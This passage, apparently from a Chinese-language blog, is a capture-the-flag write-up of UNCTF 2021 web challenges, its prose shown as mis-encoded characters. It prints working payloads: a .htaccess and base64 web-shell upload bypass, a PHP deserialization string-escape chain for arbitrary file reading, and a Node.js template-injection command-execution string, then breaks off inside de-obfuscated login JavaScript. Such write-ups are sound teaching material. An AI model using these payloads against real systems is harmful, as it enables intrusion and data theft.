å…¥æ–‡ä»¶åå’Œå†…å®¹å†™æ–‡ä»¶ï¼Œç¦ç”¨çš„å…³é”®å­—ç¦æ‰äº†ä¼ªåè®®ã€ç›®å½•ç©¿è¶Šã€å¸¸è§„PHPå¤´å’Œå†™PHPæ–‡ä»¶ã€‚</p><p>ç”±äºsandboxå†…æ— ç°æˆPHPæ–‡ä»¶ï¼Œè€ƒè™‘å†™ <code>.htaccess</code> æ–‡ä»¶å°†æ™®é€šæ–‡ä»¶ä»¥PHPæ–‡ä»¶è§£æã€‚</p><p>æ–‡ä»¶å†…æ— æ³•å†™å…¥PHPä»£ç ï¼Œå¯ä»¥å…ˆå†™å…¥base64ç¼–ç å­—ç¬¦ä¸²åï¼Œå†åˆ©ç”¨ <code>.htaccess</code> æ–‡ä»¶ä¼ªåè®®è§£æå³å¯ï¼Œ <code>.htaccess</code> æ–‡ä»¶ä¸­çš„ç”¨åˆ°çš„ <code>php</code> å…³é”®å­—ç”¨ <code>\</code> æ¢è¡Œç»•è¿‡ã€‚</p><p> <code>.htaccess</code> æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value auto_append_file &quot;p\</span><br><span class="line">hp://filter/convert.base64-decode/resource=1.jpg&quot;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><p><code>http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\%0ahp%20.jpg%0ap\%0ahp_value%20auto_append_file%20&quot;p\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot;</code></p><p><code>http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D</code></p><p>æœ€åè®¿é—® <code>1.jpg</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="variable">$action</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;function.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>) &amp;&amp; <span class="variable">$a</span> !=<span class="variable">$b</span>)&#123;</span><br><span class="line">    unserialize(filter(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>POSTä¼ å…¥ <code>action=1</code>ï¼Œå¾—åˆ° <code>function.php</code> æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me7eorite</span></span>&#123;</span><br><span class="line">    <span class="comment">//test  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$safe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;safe = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> UNCTF(<span class="string">&#x27;me7eorite&#x27;</span>,<span class="string">&#x27;me7eorite@qq.com&#x27;</span>,<span class="string">&#x27;me7eorite&#x27;</span>);           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getShell();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UNCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass  = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;this_is_fake&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&#x27;Welcome to UNCTF 2021!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ï¼ŒPHPå¼±æ¯”è¾ƒç‰¹æ€§ï¼Œæ•°ç»„ç»•è¿‡ï¼Œä¼ å…¥ <code>?a[]=1&amp;b[]=2</code>ï¼›</p><p>ç¬¬äºŒå±‚ï¼ŒPHPåºåˆ—åŒ–+ååºåˆ—åŒ–ï¼Œ<code>filter()</code> åˆ é™¤ä¸‰ç§å…³é”®å­—ï¼Œæ˜æ˜¾çš„å‡å­—ç¬¦å‹ååºåˆ—åŒ–é€ƒé€¸ã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼Œå…ˆæ­£å¸¸POSTä¼ å€¼ <code>name=z&amp;pass=x&amp;email=y</code>ï¼Œå¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</p><p><code>O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;</code>ã€‚</p><p>è§‚å¯Ÿåˆ©ç”¨é“¾ï¼šç±»<code>UNCTF</code> çš„ <code>__destruct()</code> ä¸­ï¼Œæ§åˆ¶ <code>$this-&gt;name</code> å¯ä»¥è§¦å‘ç±» <code>me7eorite</code> çš„ <code>__toString()</code>ï¼Œæ§åˆ¶ <code>$this-&gt;class</code> ä¸ºæ–°çš„ <code>me7eorite</code> å¯¹è±¡ï¼Œé¿å…è°ƒç”¨ç±» <code>UNCTF</code> çš„ <code>getShell()</code>ï¼Œè€Œè°ƒç”¨ç±» <code>me7eorite</code> çš„ <code>getShell()</code>ï¼Œå†æ§åˆ¶ <code>$this-&gt;safe</code> å¯ä»»æ„è¯»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span>-&gt;safe = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;class = <span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>ç”±äºèƒ½POSTä¼ å…¥çš„åªæœ‰åºåˆ—åŒ–éƒ¨åˆ†çš„ç±» <code>UNCTF</code> å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ç»™ <code>name</code> ä¼ å…¥æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ<code>serialize()</code> åæˆªæ–­æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼›ç»™<code>email</code> ä¼ å…¥è¿‡æ»¤å…³é”®å­—ï¼Œ<code>filter()</code> ä¹‹åä½¿åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œä¿ç•™æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæœ€åç» <code>unserialize()</code> æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹å®Œæˆåˆ©ç”¨é“¾ã€‚</p><p>å°è¯•ä¼ å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸² <code>&quot;;s:4:&quot;name&quot;;s:245:&quot;z</code> é•¿åº¦ä¸º21ï¼Œåˆ™ä½¿å¾—åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œåˆ™éœ€è¦ <code>21/len(&#39;php&#39;)=21/3=7</code> ä¸ª <code>php</code> ï¼Œå†å°† <code>/etc/passwd</code> æ¢æˆ <code>/flag</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphpphpphpphpphpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ <code>flag</code> ä¹Ÿè¢«è¿‡æ»¤ï¼ŒåŒå†™ç»•è¿‡å³å¯ã€‚</p><p>Payloadï¼š</p><p><code>http://xxx?a[]=1&amp;b[]=2</code>ï¼ŒPOSTä¼ å‚ </p><p><code>name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp</code></p><p>flagï¼š<code>UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125;</code></p><p>â€‹    </p><h3 id="nodejs-ssti"><a href="#nodejs-ssti" class="headerlink" title="nodejs_ssti"></a>nodejs_ssti</h3><p>ä¸€ä¸ªè¾“å…¥æ¡†å’Œæäº¤æŒ‰é’®ï¼Œå°è¯•SSTIè¾“å…¥ <code>&#123;&#123;2*3&#125;&#125;</code> ï¼Œå‘ç°åˆ©ç”¨ç‚¹åœ¨titleå€¼ã€‚</p><p>å°è¯• <code>&#123;&#123;print(xx)&#125;&#125;</code> å‡ºç°æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: getValue(...) is not a function</span><br><span class="line">    at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63)</span><br><span class="line">    at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:188:44</span><br><span class="line">    at String.replace (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:187:53)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:257:21</span><br><span class="line">    at Array.map (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:256:55)</span><br><span class="line">    at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:130:23</span><br></pre></td></tr></table></figure><p>è¯´æ˜ä»£ç ä½¿ç”¨çš„æ˜¯soda.jsï¼Œå®é™…æ˜¯node.jsæ³¨å…¥ï¼Œåˆ©ç”¨node.jsç‰¹æ€§ä½¿ç”¨ <code>child_process</code> è°ƒç”¨ <code>execSync()</code> æ–¹æ³•RCEã€‚</p><p>Payloadï¼š</p><p><code>http://xxx/who</code></p><p>POSTä¼ å‚ <code>name=&#123;&#123;" ".toString.constructor("return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()")()&#125;&#125;&amp;brand=web</code></p><p>flagï¼š<code>UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125;</code></p><p>â€‹    </p><h3 id="encrypt-login"><a href="#encrypt-login" class="headerlink" title="encrypt_login"></a>encrypt_login</h3><blockquote><p>å¬è¯´ä½ å¾ˆæ“…é•¿æ’åº“ï¼Ÿ</p></blockquote><p>éšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œè¿”å›æç¤ºå¯†ç ä¸ºçº¯æ•°å­—ï¼š</p><p><code>I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :)</code></p><p>æŸ¥çœ‹æºç å‘ç°å‰ç«¯åŠ å¯†jsæ–‡ä»¶ <code>encrypto.js</code>ï¼Œä»£ç å·²æ··æ·†ï¼Œæ ¹æ® <code>jsjiami.com.v6</code> å­—æ ·ï¼Œä½¿ç”¨ <a href="https://jsdec.js.org/">JSDec</a> åœ¨çº¿è§£æ··æ·†æœ‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.01s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$(<span class="string">&#x27;#submit&#x27;</span>)[<span class="string">&#x27;click&#x27;</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x326c0f = &#123;</span><br><span class="line">        <span class="string">&#x27;DTeqY&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1553aa, _0x4bb167</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1553aa == _0x4bb167;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;IeKGb&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x2ec083, _0x47b18b, _0x120b6a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2ec083(_0x47b18b, _0x120b6a);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;foePj&#x27;</span>: <span class="string">&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\nKJVXPMuQVgrw/SxkBQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iaWKq&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1c6939, _0x219dc9</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1c6939 + _0x219dc9;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;PUpKG&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x213ed6, _0xe318d3</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x213ed6 + _0xe318d3;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;JNTjF&#x27;</span>: <span class="string">&#x27;#username&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;OSnwF&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0xd115dc, _0x2bfff6</span>) </span>&#123;</span><br><span class="line">            <span 